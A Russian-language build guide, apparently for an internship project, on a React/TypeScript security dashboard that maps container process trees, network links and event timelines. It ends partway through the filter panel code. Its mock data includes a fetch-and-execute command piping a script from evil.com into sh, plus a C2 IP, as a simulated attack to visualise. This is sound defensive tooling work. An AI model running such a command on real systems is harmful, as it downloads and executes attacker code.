# Интерактивная карта активности контейнера
Адрес проекта для подготовки https://hub.mos.ru/alma.kond/container-activity-map

### 1. Понимание задачи и архитектура
**Суть:** Аналитик видит инцидент безопасности в контейнере. Ему нужно за 1 минуту понять: «Что произошло?», «Кто с кем связан?» и «Какова последовательность действий?».

**Ключевые сущности (что нужно визуализировать):**
1.  **События (Events):** Логи, алерты, действия (exec, network connect, file read).
2.  **Процессы (Processes):** Дерево процессов (PID, Parent PID).
3.  **Сеть (Network):** Соединения (IP, порты, DNS).
4.  **Контейнеры (Context):** Kubernetes поды, неймспейсы.

Docker-контейнер — это не «мини-виртуальная машина», а **изолированный процесс** на **хосте**, которому с помощью механизмов ядра Linux создали иллюзию собственной операционной системы. Понимание этого принципа — ключ к тому, чтобы не бояться Docker и правильно с ним работать.

### 🏗️ Архитектура: Кто с кем разговаривает

Прежде чем запустить контейнер, Docker проходит несколько слоёв абстракции. Это не один монолитный процесс, а набор компонентов .

1.  **Docker Client (`docker` CLI):** Это то, что ты набираешь в терминале. Сам по себе он ничего не запускает, а лишь переводит твою команду (например, `docker run`) в REST API-запрос и отправляет его демону через Unix-сокет .
2.  **Docker Daemon (`dockerd`):** Это фоновый сервис, «мозг» системы. Он принимает запросы, управляет образами, сетями и томами. Когда нужно запустить контейнер, он передаёт задачу дальше — в `containerd` .
3.  **containerd:** Менеджер жизненного цикла контейнеров. Он отвечает за скачивание образов, управление слоями файловой системы и непосредственно запуск/остановку процессов через `runc` .
4.  **runc (OCI Runtime):** Это самый низкий уровень. Именно `runc` общается с ядром Linux: он создаёт изолированные пространства имён (namespaces) и устанавливает лимиты ресурсов (cgroups), а затем запускает нужный процесс (например, `nginx`). После запуска `runc` завершается, а процесс контейнера продолжает жить под присмотром `containerd-shim` .

### 🧱 Фундамент изоляции: Namespaces и Cgroups

Вся магия контейнеров держится на двух технологиях ядра Linux, которые появились задолго до Docker.

**1. Namespaces (Пространства имён) — для изоляции**
Они создают иллюзию, что процесс находится один в системе. Каждый тип namespace изолирует свой аспект среды :

*   **PID namespace:** Процессы внутри контейнера видят только себя. Твой `nginx` внутри будет иметь PID 1, хотя на хосте у него может быть PID 12345. Он не видит других процессов хоста.
*   **Network namespace:** Контейнер получает собственный сетевой стек: свои IP-адреса, интерфейсы, таблицы маршрутизации и порты. Поэтому два контейнера могут слушать порт 80 одновременно, не конфликтуя .
*   **Mount namespace:** Процесс видит только свою файловую систему, а не всю файловую систему хоста.
*   **UTS namespace:** Позволяет контейнеру иметь собственное имя хоста (hostname).
*   **User namespace:** Позволяет запускать процесс с правами root внутри контейнера, но быть непривилегированным пользователем на хосте (это дополнительная мера безопасности) .

**2. Cgroups (Контрольные группы) — для ограничения ресурсов**
Namespaces изолируют, но не ограничивают. Без cgroups один контейнер мог бы съесть всю память или процессор хоста. Cgroups позволяют сказать ядру: «Этому процессу (или группе процессов) можно использовать не более 512 МБ памяти и 50% одного ядра CPU» . Это защищает систему от «шумных соседей» и DoS-атак.

### 📦 Файловая система: Слои и Copy-on-Write

Образ Docker (Image) — это не один большой файл, а **стек слоёв**, доступных только для чтения. Каждая инструкция в Dockerfile (`RUN`, `COPY`, `ENV`) создаёт новый слой, который содержит только изменения относительно предыдущего .

*   **Совместное использование:** Если у тебя 10 контейнеров на базе `ubuntu:latest`, базовый слой скачивается и хранится на диске **один раз**. Экономия места колоссальная .
*   **Copy-on-Write (CoW):** Когда контейнер запускается, сверху всех слоёв образа создаётся **тонкий записываемый слой** (container layer). Пока контейнер только читает файлы, они берутся из нижних слоёв. Как только процесс пытается **изменить** файл, Docker копирует этот файл из нижнего слоя в верхний (записываемый) и уже там применяет изменения. Оригинальный слой образа остаётся нетронутым .
*   **Эфемерность:** Все изменения в этом верхнем слое исчезнут, как только контейнер будет удалён. Именно поэтому в Docker не хранят данные внутри контейнера — для этого есть тома (volumes).

### 💎 Итог: Что происходит при `docker run`

1.  **CLI** отправляет запрос демону.
2.  **Демон** проверяет, есть ли локально образ. Если нет — скачивает из Registry (Docker Hub).
3.  **containerd** подготавливает файловую систему: берёт слои образа (только для чтения) и создаёт поверх них пустой записываемый слой.
4.  **runc** создаёт новый набор Namespaces (PID, Network, Mount и т.д.) и настраивает Cgroups (лимиты).
5.  **runc** «переключает корень» (pivot_root) на собранную файловую систему и запускает процесс (например, `node index.js`).
6.  Процесс работает изолированно. Ты взаимодействуешь с ним через `docker logs`, `docker exec` и проброс портов (`-p`), который настраивается через механизмы Network namespace и iptables на хосте.

Именно эта комбинация (Namespaces + Cgroups + Слоистая ФС) позволяет запускать приложение за миллисекунды, не неся накладных расходов на полноценную гостевую ОС, как в случае с виртуальными машинами.

### 2. Технологический стек (Предложения)
Так как это веб-интерфейс и фокус на визуализации, вот предлагаемый стек:

*   **Фреймворк:** React или Vue.js (React чаще используется в Enterprise, например, в PT).
*   **Язык:** TypeScript (обязательно для работы с данными мониторинга, чтобы не запутаться в структурах).
*   **Стейт-менеджер:** Redux Toolkit или Zustand (для хранения состояния фильтров и выбранных узлов).
*   **Визуализация графов (Дерево процессов и связи):**
    *   *Библиотеки:* **Cytoscape.js** (мощная, подходит для сложных сетей), **React Flow** (отличная для кастомных узлов и интерактивности), **Vis.js**.
*   **Визуализация временных шкал (Timeline):**
    *   **Visx** (от Airbnb) или **D3.js** (если нужна полная кастомизация), либо готовые решения на базе Canvas для производительности.
*   **UI Kit:** **Consta UI** (дизайн-система от Positive Technologies, идеально впишется в контекст хакатона/стажировки) или MUI/Ant Design.
*   **Стилизация:** SCSS Modules или Tailwind CSS.

### 3. Декомпозиция интерфейса
Судя по описанию, экран должен быть разделен на логические блоки. Предлагаю такой layout:

#### А. Центральная область (Граф)
*   **Что это:** Интерактивный граф (узлы и связи).
*   **Режимы отображения:**
    1.  *Дерево процессов:* Иерархия `bash -> sh -> curl`.
    2.  *Сетевая карта:* Контейнер и внешние IP.
*   **Интерактив:** Клик на узел открывает детали справа. Зум, панорамирование.

#### Б. Левая панель (Фильтры и Контекст)
*   **K8s Контекст:** Выбор Namespace, Pod, Container.
*   **Время:** Слайдер таймлайна (инцидент произошел в 12:00, показываем окно 12:00–12:05).
*   **Типы событий:** Чекбоксы (Network, Process, File, Privilege Escalation).

#### В. Правая панель (Детализация / Инспектор)
*   Когда аналитик кликает на процесс или событие, здесь отображается:
    *   Raw JSON лог.
    *   Командная строка (для процессов).
    *   Репутация IP/Domain.
    *   Связь с MITRE ATT&CK (какая тактика хакера это был).

#### Г. Нижняя панель (Timeline / Лента событий)
*   Хронологический список событий. Синхронизирован с графом: выбрал событие в ленте — подсветился узел на графе.

### 4. План реализации (Roadmap)

#### Этап 1: Данные и Мок-сервер
У тебя нет реального Runtime Radar, поэтому нужно создать **Mock Data**.
Придумай сценарий атаки:
1.  В контейнер зашел подозрительный процесс (`wget`).
2.  Скачал скрипт.
3.  Запустил `bash`.
4.  Постучался на внешний IP (C2 сервер).
5.  Попытался прочитать `/etc/shadow`.

Создай JSON-файл, который описывает эти события (nodes и links для графа).

#### Этап 2: Каркас и Верстка
Собери layout (Grid или Flexbox).
*   Сделай красивую темную тему (для Security tools это стандарт).
*   Настрой роутинг (если нужно несколько экранов).

#### Этап 3: Визуализация Графа (Самое сложное)
*   Настрой библиотеку (например, React Flow).
*   Напиши кастомные компоненты узлов (иконка процесса, иконка контейнера, иконка IP).
*   Реализуй алгоритм раскладки (Dagre layout), чтобы дерево строилось красиво и автоматически.

#### Этап 4: Связывание данных (Interactivity)
*   Реализуй логику: клик на узел графа -> фильтрация нижней панели с событиями -> обновление правой панели с деталями.
*   Добавь поиск по графу.

#### Этап 5: Полировка (UI/UX)
*   Добавь анимации (плавное появление узлов).
*   Сделай тултипы (подсказки при наведении).
*   Убедись, что интерфейс не «висит» при большом количестве событий (используй виртуализацию списков).



---

## Часть 1: Инициализация и настройка

### Шаг 1. Создание проекта

```bash
npm create vite@latest runtime-radar-mvp -- --template react-ts
cd runtime-radar-mvp
npm install
```

### Шаг 2. Установка ключевых библиотек

```bash
# Граф и раскладка
npm install reactflow dagre
npm install @types/dagre -D

# Стейт-менеджер
npm install zustand

# Стили и иконки (для MVP хватит этого)
npm install lucide-react

# Утилиты для дат
npm install date-fns
```

**Почему это:**
* `reactflow` — лучший выбор для интерактивных графов с кастомными нодами.
* `dagre` — автоматическая раскладка дерева (сверху вниз), чтобы не расставлять ноды вручную.
* `zustand` — минималистичный стейт, идеален для синхронизации графа, фильтров и правой панели.
* `lucide-react` — легкие иконки (процесс, контейнер, сеть).

---

## Часть 2: Структура проекта

```
runtime-radar-mvp/
├── public/
├── src/
│   ├── assets/                # иконки, лого
│   ├── components/
│   │   ├── graph/
│   │   │   ├── ActivityGraph.tsx      # Главный компонент графа
│   │   │   ├── nodes/
│   │   │   │   ├── ProcessNode.tsx    # Кастомная нода процесса
│   │   │   │   ├── ContainerNode.tsx  # Кастомная нода контейнера
│   │   │   │   └── NetworkNode.tsx    # Кастомная нода сети (IP)
│   │   │   └── layout.ts              # Функция раскладки dagre
│   │   ├── panels/
│   │   │   ├── FilterPanel.tsx        # Левая панель (фильтры)
│   │   │   ├── DetailsPanel.tsx       # Правая панель (детали)
│   │   │   └── TimelinePanel.tsx      # Нижняя панель (лента событий)
│   │   ├── layout/
│   │   │   ├── Header.tsx
│   │   │   └── AppLayout.tsx          # Grid-каркас
│   │   └── ui/
│   │       ├── Badge.tsx
│   │       └── Card.tsx
│   ├── data/
│   │   ├── mockEvents.ts              # Мок-данные (события)
│   │   └── mockGraph.ts               # Мок-данные (узлы и связи)
│   ├── store/
│   │   └── useAppStore.ts             # Zustand store
│   ├── types/
│   │   └── index.ts                   # Типы (Event, GraphNode, etc.)
│   ├── utils/
│   │   └── formatters.ts              # Форматирование дат, PID и т.д.
│   ├── App.tsx
│   ├── main.tsx
│   └── index.css
├── package.json
└── tsconfig.json
```

---

## Часть 3: Типы данных (фундамент)

`src/types/index.ts`

```typescript
import { Node, Edge } from 'reactflow';

export type EventType = 'process' | 'network' | 'file' | 'container';
export type Severity = 'low' | 'medium' | 'high' | 'critical';

export interface SecurityEvent {
  id: string;
  timestamp: number;
  type: EventType;
  severity: Severity;
  title: string;
  description: string;
  sourceNodeId: string;
  targetNodeId?: string;
  rawPayload?: Record<string, unknown>;
}

export type NodeKind = 'container' | 'process' | 'network';

export interface CustomNodeData {
  label: string;
  kind: NodeKind;
  pid?: number;
  cmd?: string;
  ip?: string;
  isSuspicious?: boolean;
}

export type ActivityNode = Node<CustomNodeData>;
export type ActivityEdge = Edge;
```

**Ключевая идея:** связываем события (`SecurityEvent`) и граф (`ActivityNode`) через `sourceNodeId`. Кликнул на событие — подсветилась нода.

---

## Часть 4: Мок-данные (симуляция атаки)

`src/data/mockGraph.ts`

```typescript
import { ActivityNode, ActivityEdge } from '../types';

export const initialNodes: ActivityNode[] = [
  {
    id: 'container-1',
    type: 'containerNode',
    position: { x: 0, y: 0 },
    data: { label: 'nginx-pod-7d9f', kind: 'container' },
  },
  {
    id: 'proc-bash',
    type: 'processNode',
    position: { x: 0, y: 0 },
    data: { label: 'bash', kind: 'process', pid: 1, cmd: '/bin/bash' },
  },
  {
    id: 'proc-sh',
    type: 'processNode',
    position: { x: 0, y: 0 },
    data: {
      label: 'sh',
      kind: 'process',
      pid: 42,
      cmd: 'sh -c "curl http://evil.com/x.sh | sh"',
      isSuspicious: true,
    },
  },
  {
    id: 'net-evil',
    type: 'networkNode',
    position: { x: 0, y: 0 },
    data: { label: '185.220.101.5', kind: 'network', ip: '185.220.101.5', isSuspicious: true },
  },
];

export const initialEdges: ActivityEdge[] = [
  { id: 'e1', source: 'container-1', target: 'proc-bash' },
  { id: 'e2', source: 'proc-bash', target: 'proc-sh' },
  { id: 'e3', source: 'proc-sh', target: 'net-evil' },
];
```

`src/data/mockEvents.ts`

```typescript
import { SecurityEvent } from '../types';

export const mockEvents: SecurityEvent[] = [
  {
    id: 'evt-1',
    timestamp: Date.now() - 60000,
    type: 'process',
    severity: 'low',
    title: 'Запуск процесса bash',
    description: 'PID 1 spawned',
    sourceNodeId: 'proc-bash',
  },
  {
    id: 'evt-2',
    timestamp: Date.now() - 30000,
    type: 'process',
    severity: 'high',
    title: 'Подозрительная команда',
    description: 'sh -c "curl ... | sh" — выгрузка и запуск скрипта из сети',
    sourceNodeId: 'proc-sh',
    targetNodeId: 'net-evil',
  },
  {
    id: 'evt-3',
    timestamp: Date.now() - 25000,
    type: 'network',
    severity: 'critical',
    title: 'Исходящее соединение на C2',
    description: 'Обращение к IP 185.220.101.5 (подозрительный домен)',
    sourceNodeId: 'net-evil',
  },
];
```

---

## Часть 5: Стейт (Zustand)

`src/store/useAppStore.ts`

```typescript
import { create } from 'zustand';
import { SecurityEvent, ActivityNode } from '../types';

interface AppState {
  selectedEventId: string | null;
  selectedNodeId: string | null;
  severityFilter: Record<string, boolean>;

  selectEvent: (id: string | null) => void;
  selectNode: (id: string | null) => void;
  toggleSeverity: (sev: string) => void;
}

export const useAppStore = create<AppState>((set) => ({
  selectedEventId: null,
  selectedNodeId: null,
  severityFilter: { low: true, medium: true, high: true, critical: true },

  selectEvent: (id) => set({ selectedEventId: id }),
  selectNode: (id) => set({ selectedNodeId: id }),
  toggleSeverity: (sev) =>
    set((state) => ({
      severityFilter: {
        ...state.severityFilter,
        [sev]: !state.severityFilter[sev],
      },
    })),
}));
```

---

## Часть 6: Раскладка графа (dagre)

`src/components/graph/layout.ts`

```typescript
import dagre from 'dagre';
import { ActivityNode, ActivityEdge } from '../../types';

const NODE_WIDTH = 200;
const NODE_HEIGHT = 80;

export const layoutGraph = (
  nodes: ActivityNode[],
  edges: ActivityEdge[]
): ActivityNode[] => {
  const g = new dagre.graphlib.Graph();
  g.setGraph({ rankdir: 'TB', nodesep: 60, ranksep: 80 });
  g.setDefaultEdgeLabel(() => ({}));

  nodes.forEach((node) => {
    g.setNode(node.id, { width: NODE_WIDTH, height: NODE_HEIGHT });
  });

  edges.forEach((edge) => {
    g.setEdge(edge.source, edge.target);
  });

  dagre.layout(g);

  return nodes.map((node) => {
    const pos = g.node(node.id);
    return {
      ...node,
      position: {
        x: pos.x - NODE_WIDTH / 2,
        y: pos.y - NODE_HEIGHT / 2,
      },
    };
  });
};
```

---

## Часть 7: Кастомные ноды (визуал)

`src/components/graph/nodes/ProcessNode.tsx`

```tsx
import { Handle, Position, NodeProps } from 'reactflow';
import { Cpu, AlertTriangle } from 'lucide-react';
import { CustomNodeData } from '../../../types';

export const ProcessNode = ({ data, selected }: NodeProps<CustomNodeData>) => {
  const isSuspicious = data.isSuspicious;
  const borderColor = isSuspicious
    ? 'border-red-500'
    : selected
    ? 'border-blue-400'
    : 'border-slate-600';

  return (
    <div
      className={`min-w-[200px] rounded-lg border-2 ${borderColor} bg-slate-800 p-3 text-white shadow-lg`}
    >
      <Handle type="target" position={Position.Top} />
      <div className="flex items-center gap-2">
        {isSuspicious ? (
          <AlertTriangle size={16} className="text-red-400" />
        ) : (
          <Cpu size={16} className="text-blue-400" />
        )}
        <span className="font-mono text-sm font-bold">{data.label}</span>
      </div>
      {data.pid && (
        <div className="mt-1 text-xs text-slate-400">PID: {data.pid}</div>
      )}
      {data.cmd && (
        <div className="mt-1 truncate font-mono text-xs text-slate-300">
          {data.cmd}
        </div>
      )}
      <Handle type="source" position={Position.Bottom} />
    </div>
  );
};
```

Аналогично делаешь `ContainerNode` (иконка Box) и `NetworkNode` (иконка Globe). Регистрируешь их в `nodeTypes` внутри `ActivityGraph`.

---

## Часть 8: Главный компонент графа

`src/components/graph/ActivityGraph.tsx`

```tsx
import { useMemo } from 'react';
import ReactFlow, {
  Background,
  Controls,
  MiniMap,
  useNodesState,
  useEdgesState,
} from 'reactflow';
import 'reactflow/dist/style.css';
import { initialNodes, initialEdges } from '../../data/mockGraph';
import { layoutGraph } from './layout';
import { ProcessNode } from './nodes/ProcessNode';
import { ContainerNode } from './nodes/ContainerNode';
import { NetworkNode } from './nodes/NetworkNode';
import { useAppStore } from '../../store/useAppStore';

const nodeTypes = {
  processNode: ProcessNode,
  containerNode: ContainerNode,
  networkNode: NetworkNode,
};

export const ActivityGraph = () => {
  const { selectedNodeId, selectNode } = useAppStore();

  const layoutedNodes = useMemo(
    () => layoutGraph(initialNodes, initialEdges),
    []
  );

  const [nodes, , onNodesChange] = useNodesState(
    layoutedNodes.map((n) => ({
      ...n,
      selected: n.id === selectedNodeId,
    }))
  );
  const [edges, , onEdgesChange] = useEdgesState(initialEdges);

  return (
    <div className="h-full w-full bg-slate-900">
      <ReactFlow
        nodes={nodes}
        edges={edges}
        nodeTypes={nodeTypes}
        onNodesChange={onNodesChange}
        onEdgesChange={onEdgesChange}
        onNodeClick={(_, node) => selectNode(node.id)}
        fitView
      >
        <Background color="#334155" gap={16} />
        <Controls />
        <MiniMap />
      </ReactFlow>
    </div>
  );
};
```

---

## Часть 9: Каркас приложения (Grid Layout)

`src/components/layout/AppLayout.tsx`

```tsx
export const AppLayout = ({
  header,
  filters,
  graph,
  details,
  timeline,
}: {
  header: React.ReactNode;
  filters: React.ReactNode;
  graph: React.ReactNode;
  details: React.ReactNode;
  timeline: React.ReactNode;
}) => (
  <div className="grid h-screen grid-rows-[60px_1fr_180px] bg-slate-950 text-white">
    <header className="border-b border-slate-800">{header}</header>
    <div className="grid grid-cols-[260px_1fr_320px] overflow-hidden">
      <aside className="overflow-y-auto border-r border-slate-800">
        {filters}
      </aside>
      <main className="overflow-hidden">{graph}</main>
      <aside className="overflow-y-auto border-l border-slate-800">
        {details}
      </aside>
    </div>
    <footer className="overflow-x-auto border-t border-slate-800">
      {timeline}
    </footer>
  </div>
);
```

---

## Часть 10: Нижняя панель — Timeline

`src/components/panels/TimelinePanel.tsx`

```tsx
import { mockEvents } from '../../data/mockEvents';
import { useAppStore } from '../../store/useAppStore';
import { format } from 'date-fns';
import { AlertOctagon, AlertTriangle, Info } from 'lucide-react';

const iconBySeverity = {
  critical: <AlertOctagon className="text-red-500" size={16} />,
  high: <AlertTriangle className="text-orange-400" size={16} />,
  medium: <Info className="text-yellow-400" size={16} />,
  low: <Info className="text-slate-400" size={16} />,
};

export const TimelinePanel = () => {
  const { selectedEventId, selectEvent, selectNode } = useAppStore();

  const handleClick = (id: string, nodeId: string) => {
    selectEvent(id);
    selectNode(nodeId);
  };

  return (
    <div className="flex h-full items-stretch gap-2 p-2">
      {mockEvents.map((evt) => (
        <button
          key={evt.id}
          onClick={() => handleClick(evt.id, evt.sourceNodeId)}
          className={`min-w-[240px] rounded-lg border p-3 text-left transition
            ${
              selectedEventId === evt.id
                ? 'border-blue-500 bg-slate-800'
                : 'border-slate-700 bg-slate-900 hover:bg-slate-800'
            }`}
        >
          <div className="flex items-center gap-2 text-xs text-slate-400">
            {iconBySeverity[evt.severity]}
            <span>{format(evt.timestamp, 'HH:mm:ss')}</span>
            <span className="ml-auto uppercase">{evt.severity}</span>
          </div>
          <div className="mt-2 text-sm font-semibold text-white">
            {evt.title}
          </div>
          <div className="mt-1 line-clamp-2 text-xs text-slate-400">
            {evt.description}
          </div>
        </button>
      ))}
    </div>
  );
};
```

---

## Часть 11: Сборка App

`src/App.tsx`

```tsx
import { AppLayout } from './components/layout/AppLayout';
import { ActivityGraph } from './components/graph/ActivityGraph';
import { FilterPanel } from './components/panels/FilterPanel';
import { DetailsPanel } from './components/panels/DetailsPanel';
import { TimelinePanel } from './components/panels/TimelinePanel';

export default function App() {
  return (
    <AppLayout
      header={
        <div className="flex h-full items-center px-4">
          <h1 className="text-lg font-bold">
            Runtime Radar — <span className="text-blue-400">Activity Map</span>
          </h1>
        </div>
      }
      filters={<FilterPanel />}
      graph={<ActivityGraph />}
      details={<DetailsPanel />}
      timeline={<TimelinePanel />}
    />
  );
}
```

`FilterPanel` и `DetailsPanel` — по аналогии: один рендерит чекбоксы по severity, второй показывает JSON выбранного события из `mockEvents` по `selectedEventId`.

---


# Логика «подсветки пути от события к узлу»
---

# Часть A. Логика подсветки пути

## A.1. Идея

Когда аналитик кликает на событие в таймлайне, мы должны:
1. Найти **целевой узел** события (`sourceNodeId`).
2. Найти **путь от корня** (контейнера) до этого узла — это «цепочка атаки».
3. **Подсветить** узлы и рёбра на этом пути.
4. **Затемнить** всё остальное (opacity / dimmed).
5. **Авто-зум** на этот путь, чтобы пользователь сразу видел контекст.

## A.2. Утилита поиска пути (BFS)

`src/utils/findPath.ts`

```typescript
import { ActivityEdge } from '../types';

/**
 * Возвращает упорядоченный список ID узлов от корня до targetId,
 * а также список ID рёбер, входящих в путь.
 */
export const findPathToNode = (
  targetId: string,
  edges: ActivityEdge[]
): { nodeIds: Set<string>; edgeIds: Set<string> } => {
  // 1. Строим обратный граф: child -> [parents]
  const parentsMap = new Map<string, string[]>();
  edges.forEach((edge) => {
    const parents = parentsMap.get(edge.target) ?? [];
    parents.push(edge.source);
    parentsMap.set(edge.target, parents);
  });

  // 2. BFS вверх от target до корня
  const visitedNodes = new Set<string>([targetId]);
  const visitedEdges = new Set<string>();
  const queue: string[] = [targetId];

  while (queue.length > 0) {
    const current = queue.shift()!;
    const parents = parentsMap.get(current) ?? [];

    for (const parent of parents) {
      // Находим ребро parent -> current
      const edge = edges.find(
        (e) => e.source === parent && e.target === current
      );
      if (edge) visitedEdges.add(edge.id);

      if (!visitedNodes.has(parent)) {
        visitedNodes.add(parent);
        queue.push(parent);
      }
    }
  }

  return { nodeIds: visitedNodes, edgeIds: visitedEdges };
};
```

**Почему BFS вверх, а не от корня вниз?** Потому что у нас есть точная цель (`sourceNodeId`) и может быть несколько «корней». Обратный обход от цели к корням соберёт все родительские ветки, включая общие.

## A.3. Расширение стейта

`src/store/useAppStore.ts` — обновляем:

```typescript
import { create } from 'zustand';
import { SecurityEvent } from '../types';
import { findPathToNode } from '../utils/findPath';
import { initialEdges } from '../data/mockGraph';

interface AppState {
  selectedEventId: string | null;
  selectedNodeId: string | null;
  severityFilter: Record<string, boolean>;

  // 🔦 подсветка пути
  highlightedNodeIds: Set<string>;
  highlightedEdgeIds: Set<string>;

  selectEvent: (event: SecurityEvent | null) => void;
  selectNode: (id: string | null) => void;
  toggleSeverity: (sev: string) => void;
  clearHighlight: () => void;
}

export const useAppStore = create<AppState>((set) => ({
  selectedEventId: null,
  selectedNodeId: null,
  severityFilter: { low: true, medium: true, high: true, critical: true },
  highlightedNodeIds: new Set(),
  highlightedEdgeIds: new Set(),

  selectEvent: (event) =>
    set(() => {
      if (!event) {
        return {
          selectedEventId: null,
          selectedNodeId: null,
          highlightedNodeIds: new Set(),
          highlightedEdgeIds: new Set(),
        };
      }
      const { nodeIds, edgeIds } = findPathToNode(
        event.sourceNodeId,
        initialEdges
      );
      return {
        selectedEventId: event.id,
        selectedNodeId: event.sourceNodeId,
        highlightedNodeIds: nodeIds,
        highlightedEdgeIds: edgeIds,
      };
    }),

  selectNode: (id) =>
    set(() => {
      if (!id) {
        return {
          selectedNodeId: null,
          highlightedNodeIds: new Set(),
          highlightedEdgeIds: new Set(),
        };
      }
      const { nodeIds, edgeIds } = findPathToNode(id, initialEdges);
      return {
        selectedNodeId: id,
        highlightedNodeIds: nodeIds,
        highlightedEdgeIds: edgeIds,
      };
    }),

  toggleSeverity: (sev) =>
    set((state) => ({
      severityFilter: {
        ...state.severityFilter,
        [sev]: !state.severityFilter[sev],
      },
    })),

  clearHighlight: () =>
    set({
      selectedEventId: null,
      selectedNodeId: null,
      highlightedNodeIds: new Set(),
      highlightedEdgeIds: new Set(),
    }),
}));
```

> ⚠️ **Важно:** `Set` — мутабельный объект. Zustand не заметит изменений, если ты сделаешь `set.highlightedNodeIds.add(...)`. Поэтому мы **всегда создаём новый Set** при `set`. В коде выше это соблюдено через `findPathToNode`, возвращающий новый Set.

## A.4. Применение подсветки в графе

`src/components/graph/ActivityGraph.tsx` — дорабатываем:

```tsx
import { useMemo, useEffect } from 'react';
import ReactFlow, {
  Background,
  Controls,
  MiniMap,
  useNodesState,
  useEdgesState,
  ReactFlowInstance,
} from 'reactflow';
import 'reactflow/dist/style.css';
import { useRef } from 'react';
import { initialNodes, initialEdges } from '../../data/mockGraph';
import { layoutGraph } from './layout';
import { ProcessNode } from './nodes/ProcessNode';
import { ContainerNode } from './nodes/ContainerNode';
import { NetworkNode } from './nodes/NetworkNode';
import { useAppStore } from '../../store/useAppStore';

const nodeTypes = {
  processNode: ProcessNode,
  containerNode: ContainerNode,
  networkNode: NetworkNode,
};

const LAYOUTED = layoutGraph(initialNodes, initialEdges);

export const ActivityGraph = () => {
  const {
    selectedNodeId,
    highlightedNodeIds,
    highlightedEdgeIds,
    clearHighlight,
  } = useAppStore();

  const [nodes, setNodes, onNodesChange] = useNodesState(
    LAYOUTED.map((n) => ({ ...n }))
  );
  const [edges, setEdges, onEdgesChange] = useEdgesState(
    initialEdges.map((e) => ({ ...e }))
  );

  const flowRef = useRef<ReactFlowInstance | null>(null);

  // 🔄 Реакция на изменение подсветки
  useEffect(() => {
    const hasHighlight = highlightedNodeIds.size > 0;

    setNodes((prev) =>
      prev.map((n) => ({
        ...n,
        selected: n.id === selectedNodeId,
        className: hasHighlight
          ? highlightedNodeIds.has(n.id)
            ? ''
            : 'node-dimmed'
          : '',
      }))
    );

    setEdges((prev) =>
      prev.map((e) => ({
        ...e,
        animated: highlightedEdgeIds.has(e.id),
        className: hasHighlight
          ? highlightedEdgeIds.has(e.id)
            ? 'edge-highlighted'
            : 'edge-dimmed'
          : '',
      }))
    );

    // 🔍 Авто-зум на путь
    if (hasHighlight && flowRef.current) {
      const pathNodes = nodes
        .filter((n) => highlightedNodeIds.has(n.id))
        .map((n) => ({ id: n.id }));
      if (pathNodes.length > 0) {
        flowRef.current.fitView({
          nodes: pathNodes,
          duration: 600,
          padding: 0.3,
        });
      }
    }
  }, [highlightedNodeIds, highlightedEdgeIds, selectedNodeId, setNodes, setEdges]);

  return (
    <div className="h-full w-full bg-slate-900">
      <ReactFlow
        nodes={nodes}
        edges={edges}
        nodeTypes={nodeTypes}
        onNodesChange={onNodesChange}
        onEdgesChange={onEdgesChange}
        onInit={(instance) => (flowRef.current = instance)}
        onNodeClick={(_, node) => useAppStore.getState().selectNode(node.id)}
        onPaneClick={() => clearHighlight()}
        fitView
      >
        <Background color="#334155" gap={16} />
        <Controls />
        <MiniMap />
      </ReactFlow>
    </div>
  );
};
```

## A.5. CSS для подсветки

`src/index.css` — добавляем:

```css
/* Затемнённые узлы */
.react-flow__node.node-dimmed {
  opacity: 0.25;
  filter: grayscale(0.6);
  transition: opacity 0.3s ease, filter 0.3s ease;
}

/* Рёбра */
.react-flow__edge.edge-dimmed .react-flow__edge-path {
  stroke: #334155 !important;
  stroke-opacity: 0.25;
}

.react-flow__edge.edge-highlighted .react-flow__edge-path {
  stroke: #3b82f6 !important;
  stroke-width: 2.5 !important;
  filter: drop-shadow(0 0 4px #3b82f6);
}

/* Выделенный узел (главный герой) */
.react-flow__node.selected > div {
  box-shadow: 0 0 0 2px #3b82f6, 0 0 20px rgba(59, 130, 246, 0.5);
}
```

## A.6. Итог по логике

| Шаг | Действие |
|-----|----------|
| 1 | Клик по событию в Timeline → `selectEvent(event)` |
| 2 | Store находит путь через `findPathToNode` |
| 3 | Возвращает `Set` нод и рёбер пути |
| 4 | `useEffect` в графе применяет CSS-классы `node-dimmed` / `edge-highlighted` |
| 5 | Граф автоматически зумится на путь через `fitView` |
| 6 | Клик по фону → `clearHighlight()` → всё возвращается |

---

# Часть B. `FilterPanel` детально

`src/components/panels/FilterPanel.tsx`

```tsx
import { useAppStore } from '../../store/useAppStore';
import { mockEvents } from '../../data/mockEvents';
import { AlertOctagon, AlertTriangle, Info, ShieldAlert } from 'lucide-react';

const SEVERITIES = [
  { key: 'critical', label: 'Critical', color: 'text-red-500' },
  { key: 'high', label: 'High', color: 'text-orange-400' },
  { key: 'medium', label: 'Medium', color: 'text-yellow-400' },
  { key: 'low', label: 'Low', color: 'text-slate-400' },
] as const;

const EVENT_TYPES = [
  { key: 'process', label: 'Процессы' },
  { key: 'network', label: 'Сеть' },
  { key: 'file', label: 'Файлы' },
  { key: 'container', label: 'Контейнер' },
] as const;

export const FilterPanel = () => {
  const { severityFilter, toggleSeverity } = useAppStore();

  const counts = mockEvents.reduce<Record<string, number>>((acc, e) => {
    acc[e.severity] = (acc[e.severity] ?? 0) + 1;
    return acc;
  }, {});

  return (
    <div className="p-4 text-slate-200">
      <h2 className="mb-4 flex items-center gap-2 text-sm font-bold uppercase tracking-wide text-slate-400">
        <ShieldAlert size={16} />
        Фильтры
      </h2>

      {/* K8s контекст */}
      <div className="mb-6">
        <label className="mb-1 block text-xs text-slate-500">
          Kubernetes Context
        </label>
        <select
          className="w-full rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm"
          disabled
        >
          <option>default / nginx-pod-7d9f</option>
        </select>
      </div>

      {/* Severity */}
      <section className="mb-6">
        <h3 className="mb-2 text-xs font-semibold uppercase text-slate-500">
          Severity
        </h3>
        <ul className="space-y-2">
          {SEVERITIES.map(({ key, label, color }) => (
            <li key={key}>
              <label className="flex cursor-pointer items-center gap-2 text-sm">
                <input
                  type="checkbox"
                  checked={severityFilter[key]}
                  onChange={() => toggleSeverity(key)}
                  className="accent-blue-500"
                />
                <span className={color}>{label}</span>
                <span className="ml-auto rounded bg-slate-800 px-1.5 text-xs text-slate-400">
                  {counts[key] ?? 0}
                </span>
              </label>
            </li>
          ))}
        </ul>
      </section>

      {/* Тип события */}
      <section className="mb-6">
        <h3 className="mb-2 text-xs font-semibold uppercase text-slate-500">
          Event Type
        </h3>
        <ul className="space-y-2">
          {EVENT_TYPES.map(({ key, label }) => (
            <li key={key}>
              <label className="flex cursor-pointer items-center gap-2 text-sm">
                <input
